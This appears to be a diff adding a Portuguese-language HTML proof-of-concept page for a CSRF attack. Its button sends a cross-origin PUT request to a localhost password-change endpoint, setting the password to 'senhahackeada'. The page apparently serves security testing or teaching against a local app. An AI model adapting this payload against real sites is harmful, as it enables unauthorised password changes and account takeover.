@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8" />
+    <title>CSRF Test</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        background: #f8f9fa;
+        padding: 2rem;
+        color: #333;
+      }
+      button {
+        padding: 0.5rem 1rem;
+        background: #dc3545;
+        color: white;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+      }
+      button:hover {
+        background: #c82333;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>Ataque CSRF: alteração de senha</h1>
+    <p>
+      Ao clicar no botão abaixo, será enviada uma requisição
+      <code>PUT</code> para <code>http://localhost:5000/userPassword</code> com
+      uma nova senha definida pelo atacante.
+    </p>
+    <button onclick="alterarSenhaDoUsuario()">Realizar ataque</button>
+
+    <script>
+      async function alterarSenhaDoUsuario() {
+        fetch("http://localhost:5000/api/userPassword", {
+          method: "PUT",
+          body: JSON.stringify({ novaSenha: "senhahackeada" }),
+          headers: {
+            "Content-Type": "application/json",
+          },
+        })
+          .then((response) => {
+            if (!response.ok) {
+              return response.text().then((text) => {
+                throw new Error(`${response.status}: ${text}`);
+              });
+            }
+            return response.json();
+          })
+          .then((data) => {
+            console.log(data);
+          })
+          .catch((error) => {
+            console.error("Erro:", error);
+          });
+      }
+    </script>
+  </body>
+</html>
